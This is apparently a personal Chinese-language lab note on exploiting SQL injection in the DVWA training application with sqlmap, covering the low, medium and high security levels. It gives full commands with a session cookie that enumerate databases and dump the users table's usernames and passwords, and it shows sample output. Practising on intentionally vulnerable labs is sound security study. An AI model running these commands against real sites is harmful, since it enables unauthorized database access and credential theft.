# SQL Injection + sqlmap

> ## @Date：2021-4-28
>
> ## @Author：Tanyiqu



## low

直接跑发现不可以

```shell
sqlmap.py -u "http://193.168.4.20/vulnerabilities/sqli/?id=1&Submit=Submit#" --dbs --flush-session
```



加上cookie跑一下试试，打开浏览器调试，输入 document.cookie，可以查看cookie

```shell
sqlmap.py -u "http://193.168.4.20/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=0m1toehgd6t5h4oqnfsqcjpk05; security=low" --dbs --flush-session --batch
```



成功

```shell
[15:04:43] [INFO] fetching database names
available databases [4]:
[*] dvwa
[*] information_schema
[*] mysql
[*] performance_schema
```



爆库

```shell
# 获取dvwa库的所有表
sqlmap.py -u "http://193.168.4.20/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=0m1toehgd6t5h4oqnfsqcjpk05; security=low" -D dvwa --tables --batch --flush-session

# 获取users表的所有列
sqlmap.py -u "http://193.168.4.20/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=0m1toehgd6t5h4oqnfsqcjpk05; security=low" -D dvwa -T users --columns --batch --flush-session

# 获取users表其中几列的数据
sqlmap.py -u "http://193.168.4.20/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=0m1toehgd6t5h4oqnfsqcjpk05; security=low" -D dvwa -T users -C "user,user_id,password" --dump --batch --flush-session
```

<br>

## medium

中级的和低级的就是get请求和post请求的区别

直接开跑，别忘了带上cookie

```shell
sqlmap.py -u "http://193.168.4.20/vulnerabilities/sqli/" --method=POST --data="id=1&Submit=Submit" --dbs --cookie="PHPSESSID=0m1toehgd6t5h4oqnfsqcjpk05; security=medium" --batch --flush-session
```



<br>

## high

使用bp抓包，发送的是post请求，但是提交页面与查询结果显示页面不是同一个

可以使用 --second-url 参数解决

```shell
sqlmap.py -u "http://193.168.4.20/vulnerabilities/sqli/session-input.php#" --method=POST --data="id=1&Submit=Submit" --second-url="http://193.168.4.20/vulnerabilities/sqli/" --cookie="PHPSESSID=0m1toehgd6t5h4oqnfsqcjpk05; security=high" --dbs --batch --flush-session
```

参考：https://blog.csdn.net/qq_42630215/article/details/106402831

<br>

更多方法待补充